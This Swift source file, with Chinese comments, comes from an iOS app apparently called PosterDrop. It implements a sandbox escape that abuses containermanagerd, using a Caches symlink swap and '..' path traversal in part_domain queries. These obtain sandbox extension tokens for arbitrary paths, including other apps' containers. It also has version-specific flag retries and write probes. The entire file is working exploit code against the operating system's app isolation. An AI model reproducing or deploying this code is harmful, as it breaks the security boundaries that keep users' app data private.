//
//  SandboxEscape.swift
//  PosterDrop
//
//  整个 App 的唯一底层：worse_query 的 App Group 沙箱逃逸。
//  参考（非拷贝）forcequitOS/worse_query 与 WQFiles 的公开实现，关键点：
//
//    1. 查询必须用 **App Group 容器**（class 7）+ container_query_set_group_identifiers，
//       签名里必须有 com.apple.security.application-groups；
//    2. 交换点是 `<group>/Library/Caches`：先把它换成指向目标的符号链接，再查 part=3；
//       守护进程拼出的路径没有 realpath 校验，签出来的扩展就落在目标上；
//    3. iOS 27 用 0x0000008000000000，iOS 26 用 0x0000000800000000；
//       “签发成功”不等于“真的能打开”，必须验证后换另一组 flags 重试；
//    4. **扩展只覆盖签发时指定的那一个目录**（实测 27.0.1）：写文件前必须先给
//       文件所在的目录本身签发，仅给容器根签发还不够——这是之前写不进去的原因之一；
//    5. 扩展数量有内核上限，缓存按路径限额、最旧的先释放；交换过程留恢复标记。
//
//  性能：
//   - dlopen / dlsym 只做一次（Symbols 静态表），原来每次签发都要重载两个 dylib；
//   - 批量签发（beginBatch / endBatch）只安装一次符号链接，之后每个目标只改链接，
//     不再“移走 Caches → 写标记 plist → 移回”，扫描几百个容器时差别是几秒；
//   - App Group 容器路径只解析一次。
//

import Foundation
import CoreFoundation
import Darwin

/// 一次已持有的沙箱扩展。释放由 SandboxEscape 统一管理。
final class EscapeSession: @unchecked Sendable {

    let target: String
    let group: String
    let handle: Int64
    /// 这个扩展是否通过了写探针（能在这个目录里创建文件）
    let writable: Bool

    init(target: String, group: String, handle: Int64, writable: Bool) {
        self.target = target
        self.group = group
        self.handle = handle
        self.writable = writable
    }

    var label: String { "App Group（\(group)）" }
}

enum SandboxEscape {

    struct Failure: LocalizedError {
        let code: Int64
        let message: String
        var errorDescription: String? { "\(message)（代码 \(code)）" }
    }

    // MARK: - 签名里的 App Group

    private static var cachedEntitledGroups: [String]?

    /// 从自身签名读取 com.apple.security.application-groups。
    /// 用签名里的名字而不是写死，重签时换成任何 profile 允许的 group 都能工作。
    static func entitledGroups() -> [String] {
        if let cached = cachedEntitledGroups { return cached }

        guard let security = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW) else {
            cachedEntitledGroups = []
            return []
        }
        defer { dlclose(security) }

        typealias CreateFromSelf = @convention(c) (CFAllocator?) -> UnsafeMutableRawPointer?
        typealias CopyValue = @convention(c) (UnsafeMutableRawPointer?, CFString, UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?

        guard let createPtr = dlsym(security, "SecTaskCreateFromSelf"),
              let copyPtr = dlsym(security, "SecTaskCopyValueForEntitlement") else {
            cachedEntitledGroups = []
            return []
        }
        let create = unsafeBitCast(createPtr, to: CreateFromSelf.self)
        let copyValue = unsafeBitCast(copyPtr, to: CopyValue.self)

        guard let task = create(kCFAllocatorDefault) else {
            cachedEntitledGroups = []
            return []
        }
        defer { Unmanaged<AnyObject>.fromOpaque(task).release() }

        guard let value = copyValue(task, "com.apple.security.application-groups" as CFString, nil) else {
            cachedEntitledGroups = []
            return []
        }
        let object = Unmanaged<AnyObject>.fromOpaque(value).takeRetainedValue()
        let groups = (object as? [String]) ?? []
        cachedEntitledGroups = groups
        return groups
    }

    /// 选一个容器真实存在的 group：优先用户填的，其次签名里的第一个可用项。
    static func usableGroup(preferred: String? = nil) -> String? {
        let candidates = entitledGroups()

        if let preferred, !preferred.isEmpty, groupContainerPath(preferred) != nil {
            return preferred
        }
        for group in candidates where groupContainerPath(group) != nil {
            return group
        }
        return nil
    }

    /// 容器路径只解析一次：每次签发都走一遍 containerURL 是纯浪费。
    private static var groupPaths: [String: String] = [:]

    static func groupContainerPath(_ group: String) -> String? {
        if let cached = groupPaths[group] { return cached }
        guard let url = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group) else {
            return nil
        }
        groupPaths[group] = url.path
        return url.path
    }

    // MARK: - 系统符号（只解析一次）

    private typealias QueryCreate = @convention(c) () -> UnsafeMutableRawPointer?
    private typealias QuerySetClass = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QuerySetIDs = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
    private typealias QuerySetFlags = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    private typealias QuerySetPart = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
    /// part_domain 是 containermanagerd 内部解析的相对路径字符串。
    /// 传 `..…/绝对路径` 就能让 part 落到任意位置，不需要真的把 Caches 移走。
    private typealias QuerySetPartDomain = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
    private typealias QueryGetSingle = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
    private typealias QueryFree = @convention(c) (UnsafeMutableRawPointer?) -> Void
    private typealias CopyToken = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutablePointer<CChar>?
    private typealias XPCStringCreate = @convention(c) (UnsafePointer<CChar>?) -> UnsafeMutableRawPointer?
    private typealias Consume = @convention(c) (UnsafePointer<CChar>?) -> Int64
    private typealias Release = @convention(c) (Int64) -> Void

    /// 第一次用到时解析，之后全部命中静态表。dlopen/dlclose 每次签发都做是旧版最大的固定开销。
    private enum Symbols {

        private static let manager: UnsafeMutableRawPointer? = dlopen(
            "/usr/lib/system/libsystem_containermanager.dylib",
            RTLD_NOW | RTLD_LOCAL
        )

        private static let xpc: UnsafeMutableRawPointer? = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW)

        private static func load<T>(_ name: String, in handle: UnsafeMutableRawPointer?, as type: T.Type) -> T? {
            guard let handle, let pointer = dlsym(handle, name) else { return nil }
            return unsafeBitCast(pointer, to: type)
        }

        static let queryCreate = load("container_query_create", in: manager, as: QueryCreate.self)
        static let querySetClass = load("container_query_set_class", in: manager, as: QuerySetClass.self)
        static let querySetGroups = load("container_query_set_group_identifiers", in: manager, as: QuerySetIDs.self)
        static let querySetPart = load("container_query_operation_set_part", in: manager, as: QuerySetPart.self)
        static let querySetPartDomain = load("container_query_operation_set_part_domain", in: manager, as: QuerySetPartDomain.self)
        static let querySetFlags = load("container_query_operation_set_flags", in: manager, as: QuerySetFlags.self)
        static let querySingle = load("container_query_get_single_result", in: manager, as: QueryGetSingle.self)
        static let queryFree = load("container_query_free", in: manager, as: QueryFree.self)
        static let copyToken = load("container_copy_sandbox_token", in: manager, as: CopyToken.self)
        static let xpcString = load("xpc_string_create", in: xpc, as: XPCStringCreate.self)

        static let consumePointer: UnsafeMutableRawPointer? = dlsym(
            UnsafeMutableRawPointer(bitPattern: -2),
            "sandbox_extension_consume"
        )
        static let releasePointer: UnsafeMutableRawPointer? = dlsym(
            UnsafeMutableRawPointer(bitPattern: -2),
            "sandbox_extension_release"
        )

        static let consume: Consume? = {
            guard let pointer = consumePointer else { return nil }
            return unsafeBitCast(pointer, to: Consume.self)
        }()

        static let release: Release? = {
            guard let pointer = releasePointer else { return nil }
            return unsafeBitCast(pointer, to: Release.self)
        }()
    }

    // MARK: - 并发与缓存

    /// 整个进程同一时间只能有一个 Caches 交换。它同时保护「交换 → 查询 → 验证」这段临界区。
    private static let gate = NSRecursiveLock()

    private static var grants: [String: EscapeSession] = [:]
    private static var grantOrder: [String] = []
    /// 常驻扩展：容器父目录签一次就能覆盖所有 App 的容器，这种不能参与淘汰，
    /// 否则扫到第 200 个 App 时它已经被挤掉，前面的命中全部失效。
    private static var pinned: EscapeSession?
    /// 内核允许的扩展数量有限。WQFiles 用 192，这里保持一致。
    private static let maxGrants = 192

    /// 查找已经签发、且覆盖了 `path` 的祖先目录。
    ///
    /// 扩展是递归的：签发一个目录就等于签发它的整棵子树。清理页要对每个 App 的
    /// 8 个缓存目录逐个签发，如果每次都真的走一趟 XPC，几十个 App 就是上千次往返，
    /// 这正是扫描慢的主因。命中祖先时直接复用，只做一次 lstat + open 验证。
    private static func coveringSession(for path: String, needsWrite: Bool) -> EscapeSession? {
        var best: EscapeSession?
        var bestLength = 0

        for (key, session) in grants {
            guard key.count < path.count, path.hasPrefix(key) else { continue }
            // 必须是路径分隔符，否则 /a/bc 会被 /a/b 误判为子路径
            guard path[path.index(path.startIndex, offsetBy: key.count)] == "/" else { continue }
            if needsWrite && !session.writable { continue }
            if key.count > bestLength {
                best = session
                bestLength = key.count
            }
        }
        return best
    }

    /// 把一个扩展设为常驻：不进 LRU，不会被后续签发挤掉。
    static func pin(_ session: EscapeSession) {
        gate.lock()
        defer { gate.unlock() }
        if let old = pinned, old.handle != session.handle {
            release(old.handle)
        }
        pinned = session
        // 同时放进 grants 供 cached / coveringSession 命中，但不进 LRU 队列
        grants[session.target] = session
    }

    static func cached(_ key: String) -> EscapeSession? {
        guard let session = grants[key] else { return nil }
        // 常驻扩展不参与 LRU 调整，否则会被后续签发挤到队首再淘汰
        if let resident = pinned, resident.target == key { return session }
        grantOrder.removeAll { $0 == key }
        grantOrder.append(key)
        return session
    }

    private static func remember(_ session: EscapeSession, key: String) {
        if let existing = grants[key], existing.handle != session.handle {
            release(existing.handle)
        }
        while grantOrder.count >= maxGrants, let oldest = grantOrder.first {
            if let victim = grants.removeValue(forKey: oldest) {
                release(victim.handle)
            }
            grantOrder.removeFirst()
        }
        grants[key] = session
        grantOrder.removeAll { $0 == key }
        grantOrder.append(key)
    }

    static func release(_ handle: Int64) {
        guard handle >= 0, let releaseHandle = Symbols.release else { return }
        _ = releaseHandle(handle)
    }

    // MARK: - 批量签发

    /// 批量模式下常驻的交换：只安装一次符号链接，之后每次签发改一下指向。
    private struct Batch {
        let group: String
        let swap: CacheSwap
        let started: Date
    }

    private static var batch: Batch?
    private static var batchDepth = 0
    /// 保险：批量作用域忘了关闭时，超过这个时间就自动收尾，别让 Caches 一直是符号链接。
    private static let batchTimeout: TimeInterval = 180

    /// 开始一段批量签发。和 endBatch 必须成对（defer 最稳）。
    static func beginBatch(group: String) {
        gate.lock()
        defer { gate.unlock() }

        if batchDepth > 0 {
            batchDepth += 1
            return
        }
        // part_domain 走通时不需要交换：保持 Caches 原样，
        // 扫描被系统中断时也不会留下一个指向别处的符号链接。
        if !partDomainBroken, Symbols.querySetPartDomain != nil {
            batchDepth = 1
            return
        }
        guard let base = groupContainerPath(group),
              let swap = try? CacheSwap(library: base + "/Library") else { return }
        batch = Batch(group: group, swap: swap, started: Date())
        batchDepth = 1
    }

    static func endBatch() {
        gate.lock()
        defer { gate.unlock() }

        guard batchDepth > 0 else { return }
        batchDepth -= 1
        guard batchDepth == 0 else { return }
        if let current = batch {
            batch = nil
            current.swap.finish()
        }
    }

    /// 取当前可复用的交换；超时或 group 不匹配就收掉。
    private static func activeSwap(for group: String) -> CacheSwap? {
        guard let current = batch else { return nil }
        if Date().timeIntervalSince(current.started) > batchTimeout {
            batch = nil
            batchDepth = 0
            current.swap.finish()
            return nil
        }
        return current.group == group ? current.swap : nil
    }

    // MARK: - 申请

    /// 给一个已经存在的目录/文件申请扩展。
    /// - Parameter requireWrite: 为 true 时，签发后真的在目录里建一个探针文件，建不出来就算失败。
    @discardableResult
    static func grant(
        path: String,
        group: String,
        requireWrite: Bool = false,
        pinned: Bool = false
    ) throws -> EscapeSession {
        let canonical = canonicalPath(path)

        gate.lock()
        defer { gate.unlock() }

        if let hit = cached(canonical), !requireWrite || hit.writable {
            return hit
        }

        // 祖先已签发就直接用：省掉一次 retarget + queryToken（XPC 往返）。
        // 用 lstat + open 双重确认，扩展被内核回收时不会误判为可用。
        if let ancestor = coveringSession(for: canonical, needsWrite: requireWrite) {
            var probe = stat()
            if lstat(canonical, &probe) == 0, opens(canonical) {
                return ancestor
            }
        }

        // 沙盒会把「别的 App 的容器」的 stat 拦成 EPERM，但它确实存在。
        // fsgetpath 反查出来的路径更是如此：路径本身是可信的，只是没权限看元数据。
        // 这两种情况要放行——否则 ⑤ 枚举出来的几百个容器会全部卡在 -255，
        // 一次全盘扫描就白扫了。真正不存在（ENOENT）才报 -255。
        var status = stat()
        let statOK = lstat(canonical, &status) == 0
        if !statOK, errno != EPERM, errno != EACCES {
            throw Failure(code: -255, message: "目标不存在：\(canonical)")
        }
        // 拿不到元数据时假定是目录：容器根和父目录都是目录，文件的情况由签发结果兜底。
        let isDirectory = statOK ? (status.st_mode & S_IFMT) == S_IFDIR : true

        // iOS 27 先试标准 flags，iOS 26 先试备用 flags；成功的那组会记下来。
        let preferAlt = preferredAltFlags()
        var candidates: [UInt64] = preferAlt
            ? [altFlags, standardFlags]
            : [standardFlags, altFlags]
        candidates.append(leaseFlags)

        var lastCode: Int64 = -5
        var trail: [String] = []

        /// 试一条 part_domain 通道：所有层数 × 所有 flags。
        /// `denied` 等于组合总数时，说明 daemon 对这条通道整体拒绝，本轮不必再试。
        func attempt(
            _ containerClass: UInt64,
            _ identifier: String,
            _ levelList: [Int]
        ) -> (session: EscapeSession?, denied: Int, last: Int64) {
            var refused = 0
            for flags in candidates {
                for level in levelList {
                    let handle: Int64
                    do {
                        handle = try partDomainToken(
                            path: canonical,
                            containerClass: containerClass,
                            identifier: identifier,
                            levels: level,
                            flags: flags
                        )
                    } catch let failure as Failure {
                        lastCode = failure.code
                        if failure.code == -5 || failure.code == -6 { refused += 1 }
                        continue
                    } catch {
                        lastCode = -9
                        continue
                    }

                    guard opens(canonical) else {
                        release(handle)
                        lastCode = -8
                        continue
                    }

                    var writable = false
                    if requireWrite {
                        writable = canWrite(canonical, isDirectory: isDirectory)
                        guard writable else {
                            release(handle)
                            lastCode = -8
                            continue
                        }
                    }

                    let session = EscapeSession(
                        target: canonical, group: group, handle: handle, writable: writable
                    )
                    if pinned {
                        Self.pin(session)
                    } else {
                        remember(session, key: canonical)
                    }
                    noteWorkingFlags(flags)
                    return (session, refused, lastCode)
                }
            }
            return (nil, refused, lastCode)
        }

        if Symbols.querySetPartDomain != nil {
            // ① systemgroup：3105 唯一的签发路径（`bad_query` 传 NULL 走的那条）。
            // 它不依赖签名里的 App Group，27.3 上仍然签发。
            if !systemGroupBroken {
                let result = attempt(
                    containerClassSystemGroup, systemGroupIdentifier, systemGroupLevels
                )
                if let session = result.session { return session }
                trail.append("systemgroup=\(result.last)")
                if result.denied == candidates.count * systemGroupLevels.count {
                    systemGroupBroken = true
                }
            }

            // ② 自己的 App Group：少数版本允许，试一次不亏。
            let groupLevels = partDomainLevels(group: group)
            if !partDomainBroken {
                let result = attempt(containerClassAppGroup, group, groupLevels)
                if let session = result.session { return session }
                trail.append("appgroup=\(result.last)")
                if result.denied == candidates.count * groupLevels.count {
                    partDomainBroken = true
                }
            }
        }

        // ③ Caches 符号链接交换：旧路径，26.x 主用。
        // 批量作用域内复用同一个交换，避免每个目标都移走/移回 Caches。
        guard let base = groupContainerPath(group) else {
            throw Failure(code: -1, message: "App Group 容器不存在，签名里缺少 \(group) 的 entitlement")
        }
        let shared = activeSwap(for: group)
        let owned: CacheSwap?
        let swap: CacheSwap
        if let shared {
            owned = nil
            swap = shared
        } else {
            let created = try CacheSwap(library: base + "/Library")
            owned = created
            swap = created
        }
        defer { owned?.finish() }

        for flags in candidates {
            let handle: Int64
            do {
                try swap.retarget(to: canonical)
                handle = try queryToken(group: group, flags: flags)
            } catch let failure as Failure {
                lastCode = failure.code
                continue
            }

            var writable = false
            if opens(canonical) {
                if requireWrite {
                    writable = canWrite(canonical, isDirectory: isDirectory)
                    guard writable else {
                        release(handle)
                        lastCode = -8
                        continue
                    }
                }
                let session = EscapeSession(target: canonical, group: group, handle: handle, writable: writable)
                if pinned {
                    // 常驻扩展不走 LRU，否则扫到第 192 个容器时它已经被挤掉
                    Self.pin(session)
                } else {
                    remember(session, key: canonical)
                }
                noteWorkingFlags(flags)
                return session
            }

            // 签发并 consume 都成功，却打不开目标：换另一组 flags 重来
            release(handle)
            lastCode = -8
        }

        trail.append("swap=\(lastCode)")
        throw Failure(
            code: lastCode,
            message: describe(lastCode) + "（" + trail.joined(separator: "，") + "）"
        )
    }

    /// 只读够用；写文件前用这个（例如目标目录是新建的）。
    @discardableResult
    static func grantWritable(path: String, group: String) throws -> EscapeSession {
        try grant(path: path, group: group, requireWrite: true)
    }

    /// 给一个还不存在的路径申请扩展：沿父目录向上找第一个存在且可授权的位置。
    static func grantNearestExisting(path: String, group: String, requireWrite: Bool = false) -> EscapeSession? {
        var current = canonicalPath(path)
        while current != "/" && current != "." {
            if let session = try? grant(path: current, group: group, requireWrite: requireWrite) {
                return session
            }
            current = (current as NSString).deletingLastPathComponent
        }
        return nil
    }

    // MARK: - flags

    private static let standardFlags: UInt64 = 0x0000_0080_0000_0000
    private static let altFlags: UInt64 = 0x0000_0008_0000_0000
    /// 3105 的 MCMRetainedLease 用这组（bit 32 + 35）。bad_query 不用，
    /// 但 27.3 上另外两组都被拒，多试一组不亏。
    private static let leaseFlags: UInt64 = 0x0000_0009_0000_0000
    private static var workingFlags: UInt64?

    private static func preferredAltFlags() -> Bool {
        guard let workingFlags else {
            return ProcessInfo.processInfo.operatingSystemVersion.majorVersion < 27
        }
        return workingFlags == altFlags
    }

    private static func noteWorkingFlags(_ value: UInt64) {
        guard workingFlags == nil else { return }
        workingFlags = value
    }

    // MARK: - 查询

    private static let containerClassAppGroup: UInt64 = 7
    private static let partCaches: UInt64 = 3

    /// part_domain 的 `..` 层数：`<group>/Library/Caches` 回到卷根要经过的层数。
    /// 正常是 9，但不同系统版本的 AppGroup 目录深度可能差一层，所以把 ±1 一起试。
    private static func partDomainLevels(group: String) -> [Int] {
        guard let base = groupContainerPath(group) else { return [9] }
        let depth = base.split(separator: "/").count + 2
        return [depth, depth - 1, depth + 1]
    }

    /// 用 part_domain 的相对路径穿越签发，**不移动 Caches**。
    ///
    /// containermanagerd 解析 part 时把 domain 字符串和自己的容器路径直接拼接，
    /// 不校验 `..` 是否越界。part=3 的基点是 `<group>/Library/Caches`，
    /// 上溯 `levels` 层到卷根后接目标绝对路径，daemon 就把 token 发给目标。
    ///
    /// 这是 3105 的主路径（`bad_query.c` 的 `query_set_part_domain`）。
    /// 我们原来用的 Caches 符号链接交换在 iOS 27.3 上会让
    /// `container_copy_sandbox_token` 返回 NULL（-6），而这条仍然签发。
    private static func partDomainToken(
        path: String,
        containerClass: UInt64,
        identifier: String,
        levels: Int,
        flags: UInt64
    ) throws -> Int64 {
        guard let create = Symbols.queryCreate,
              let setClass = Symbols.querySetClass,
              let setGroups = Symbols.querySetGroups,
              let setPart = Symbols.querySetPart,
              let setPartDomain = Symbols.querySetPartDomain,
              let setFlags = Symbols.querySetFlags,
              let single = Symbols.querySingle,
              let freeQuery = Symbols.queryFree,
              let copyToken = Symbols.copyToken,
              let xpcString = Symbols.xpcString,
              let consume = Symbols.consume
        else {
            throw Failure(code: -2, message: "系统缺少 part_domain 符号")
        }

        guard let query = create() else {
            throw Failure(code: -3, message: "创建容器查询失败")
        }
        defer { freeQuery(query) }

        setClass(query, containerClass)
        let value = xpcString(identifier)
        setGroups(query, value)
        setPart(query, partCaches)

        // 顺序照 3105 的 bad_query：part → part_domain → flags → 查询。
        // 先 setFlags 再 setPartDomain 会让 daemon 用旧的 part 解析结果。
        let domain = Array(repeating: "..", count: levels).joined(separator: "/") + path
        let result = domain.withCString { pointer -> UnsafeMutableRawPointer? in
            setPartDomain(query, pointer)
            setFlags(query, flags)
            return single(query)
        }
        guard let result else {
            throw Failure(code: -5, message: "part_domain 被拒绝（上溯 \(levels) 层）")
        }
        guard let token = copyToken(result) else {
            throw Failure(code: -6, message: "part_domain 有结果但没有 token")
        }
        defer { free(token) }

        let handle = consume(token)
        guard handle >= 0 else {
            throw Failure(code: handle, message: describe(handle))
        }
        return handle
    }

    /// 3105 的主路径：`bad_query` 传 `group_identifier = NULL`，用的是
    /// systemgroup 里人人都能查的那个 group，**不需要签名里有任何 App Group**。
    /// 它的容器在 `/private/var/containers/Shared/SystemGroup/<UUID>`，
    /// 从 `<容器>/Library/Caches` 上溯 8 层到卷根。
    private static let containerClassSystemGroup: UInt64 = 13
    private static let systemGroupIdentifier = "systemgroup.com.apple.mobilegestaltcache"
    private static let systemGroupLevels = [8, 9, 10, 7]

    /// 签发通道。part_domain 不动磁盘，成功一次之后就一直用它。
    private static var systemGroupBroken = false
    private static var partDomainBroken = false

    /// 清掉「这条通道不可用」的短期记忆。自检按钮会先调它，
    /// 否则第一次失败之后，后面的日志里只剩 swap=-6，看不出前两级的结果。
    static func resetChannelProbe() {
        gate.lock()
        defer { gate.unlock() }
        systemGroupBroken = false
        partDomainBroken = false
    }

    /// 发一次查询并 consume 拿到的 token。
    /// 前置条件：`<group>/Library/Caches` 此刻已是指向目标路径的符号链接，且已持有 gate。
    private static func queryToken(group: String, flags: UInt64) throws -> Int64 {
        guard let create = Symbols.queryCreate,
              let setClass = Symbols.querySetClass,
              let setGroups = Symbols.querySetGroups,
              let setPart = Symbols.querySetPart,
              let setFlags = Symbols.querySetFlags,
              let single = Symbols.querySingle,
              let freeQuery = Symbols.queryFree,
              let copyToken = Symbols.copyToken,
              let xpcString = Symbols.xpcString,
              let consume = Symbols.consume
        else {
            throw Failure(code: -2, message: "系统缺少容器查询符号，可能已被修补")
        }

        guard let query = create() else {
            throw Failure(code: -3, message: "创建容器查询失败")
        }
        defer { freeQuery(query) }

        setClass(query, containerClassAppGroup)
        let groupValue = xpcString(group)
        setGroups(query, groupValue)
        setPart(query, partCaches)
        setFlags(query, flags)

        guard let result = single(query) else {
            throw Failure(code: -5, message: "containermanagerd 拒绝了这次查询（group=\(group)）")
        }
        guard let token = copyToken(result) else {
            throw Failure(code: -6, message: "内核拒绝签发沙箱扩展")
        }
        defer { free(token) }

        let handle = consume(token)
        guard handle >= 0 else {
            throw Failure(code: handle, message: describe(handle))
        }
        return handle
    }

    // MARK: - 访问检查

    /// 只把 EPERM 当成“扩展没生效”；EACCES 是普通权限问题（root 拥有的目录），换 flags 也没用。
    static func opens(_ path: String) -> Bool {
        let fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC)
        if fd >= 0 {
            close(fd)
            return true
        }
        return errno != EPERM
    }

    /// 目录能不能列出内容（父目录扩展是否真的生效）。
    static func canList(_ path: String) -> Bool {
        guard let directory = opendir(path) else { return false }
        defer { closedir(directory) }
        // opendir 被沙箱拒绝时返回 nil；能打开就说明至少拿到了目录读权限。
        _ = readdir(directory)
        return true
    }

    /// 在目录里真的建一个文件再删掉。扩展只覆盖签发目录本身，这是唯一可靠的写权限证据。
    private static func canWrite(_ path: String, isDirectory: Bool) -> Bool {
        if isDirectory {
            let probe = path + "/.pd-probe-\(getpid())-\(UInt32.random(in: 1...UInt32.max))"
            let fd = open(probe, O_CREAT | O_EXCL | O_WRONLY | O_CLOEXEC, 0o600)
            guard fd >= 0 else { return false }
            close(fd)
            unlink(probe)
            return true
        }
        let fd = open(path, O_WRONLY | O_CLOEXEC)
        guard fd >= 0 else { return false }
        close(fd)
        return true
    }

    // MARK: - 路径工具

    static func canonicalPath(_ path: String) -> String {
        var resolved = (path as NSString).standardizingPath
        if resolved.hasPrefix("/var/") {
            resolved = "/private" + resolved
        }
        return resolved
    }

    static func describe(_ code: Int64) -> String {
        switch code {
        case -1: return "App Group 容器不存在（签名里缺少 App Groups 权限，或 group 名字不匹配）"
        case -2: return "系统缺少所需符号，可能已修补"
        case -3: return "创建查询失败"
        case -4: return "无法交换 Library/Caches（可能另一个交换正在进行）"
        case -5: return "containermanagerd 拒绝了这次查询"
        case -6: return "内核拒绝签发沙箱扩展"
        case -7: return "扩展已签发但无法 consume"
        case -8: return "扩展已签发，但目标仍无法打开/写入（flags 不匹配或系统已修补）"
        case -255: return "目标路径无效"
        default: return "未知错误"
        }
    }

    // MARK: - Caches 交换（可恢复）

    /// 把 `<group>/Library/Caches` 换成指向目标的符号链接，结束后原样还原。
    /// 交换前先写恢复标记：进程若中途被杀，下次启动 recover() 会把 Caches 换回来。
    final class CacheSwap {

        private let library: String
        private let backupName = "Caches.posterdrop-backup"
        private let markerName = ".posterdrop-swap.plist"
        private let lockFD: Int32
        private var active = false

        init(library: String) throws {
            self.library = library

            try FileManager.default.createDirectory(atPath: library, withIntermediateDirectories: true)

            let lockPath = library + "/.posterdrop-swap.lock"
            lockFD = open(lockPath, O_CREAT | O_RDWR, 0o600)
            guard lockFD >= 0 else {
                throw Failure(code: -4, message: "无法创建交换锁：\(library)")
            }
            guard flock(lockFD, LOCK_EX | LOCK_NB) == 0 else {
                close(lockFD)
                throw Failure(code: -4, message: "另一个交换正在进行")
            }

            // 上一次异常退出留下的现场，先恢复
            CacheSwap.recover(library: library)

            let caches = library + "/Caches"
            let backup = library + "/" + backupName
            let fileManager = FileManager.default

            var isDirectory: ObjCBool = false
            if fileManager.fileExists(atPath: caches, isDirectory: &isDirectory) {
                if isDirectory.boolValue {
                    try? fileManager.removeItem(atPath: backup)
                    do {
                        try fileManager.moveItem(atPath: caches, toPath: backup)
                    } catch {
                        close(lockFD)
                        throw Failure(code: -4, message: "无法移走原 Caches：\(error.localizedDescription)")
                    }
                } else {
                    try? fileManager.removeItem(atPath: caches)
                }
            }

            writeMarker()
            active = true
        }

        /// 把符号链接指向目标；批量签发时只改链接，省掉移走/移回 Caches 的开销。
        func retarget(to target: String) throws {
            let caches = library + "/Caches"
            try? FileManager.default.removeItem(atPath: caches)
            do {
                try FileManager.default.createSymbolicLink(atPath: caches, withDestinationPath: target)
            } catch {
                throw Failure(code: -4, message: "无法创建符号链接：\(error.localizedDescription)")
            }
        }

        func finish() {
            guard active else {
                close(lockFD)
                return
            }
            CacheSwap.recover(library: library)
            close(lockFD)
            active = false
        }

        private func writeMarker() {
            let marker: [String: String] = ["backup": backupName, "version": "2"]
            guard let data = try? PropertyListSerialization.data(fromPropertyList: marker, format: .xml, options: 0) else {
                return
            }
            try? data.write(to: URL(fileURLWithPath: library + "/" + markerName), options: .atomic)
        }

        /// 还原：删掉符号链接，把备份目录换回来。可重复调用。
        static func recover(library: String) {
            let fileManager = FileManager.default
            let markerPath = library + "/.posterdrop-swap.plist"
            let backup = library + "/Caches.posterdrop-backup"
            let caches = library + "/Caches"

            let hasMarker = fileManager.fileExists(atPath: markerPath)

            var status = stat()
            let isLink = lstat(caches, &status) == 0 && (status.st_mode & S_IFMT) == S_IFLNK
            if isLink {
                // 只有符号链接是这次交换留下的，删它是安全的
                try? fileManager.removeItem(atPath: caches)
            }

            if fileManager.fileExists(atPath: backup) {
                if !fileManager.fileExists(atPath: caches) {
                    try? fileManager.moveItem(atPath: backup, toPath: caches)
                }
            } else if !fileManager.fileExists(atPath: caches) {
                try? fileManager.createDirectory(atPath: caches, withIntermediateDirectories: false)
            }

            if hasMarker {
                try? fileManager.removeItem(atPath: markerPath)
            }
        }
    }

    /// lstat 会不会被沙箱拦？拦了就当作不存在。
    static func exists(_ path: String) -> Bool {
        var status = stat()
        return lstat(path, &status) == 0
    }

    // MARK: - 容器标识

    /// 容器的扩展属性 com.apple.containermanager.identifier，值形如 com.apple.PosterBoard。
    static func containerIdentifier(at path: String) -> String? {
        var buffer = [CChar](repeating: 0, count: 1024)
        let length = getxattr(path, "com.apple.containermanager.identifier", &buffer, buffer.count - 1, 0, 0)
        guard length > 0 else { return nil }
        let value = String(cString: buffer)
        return value.isEmpty ? nil : value
    }

    /// 启动时调用：把上次异常中断的交换恢复掉。
    static func recoverPendingSwaps() {
        for group in entitledGroups() {
            guard let base = groupContainerPath(group) else { continue }
            CacheSwap.recover(library: base + "/Library")
        }
    }
}
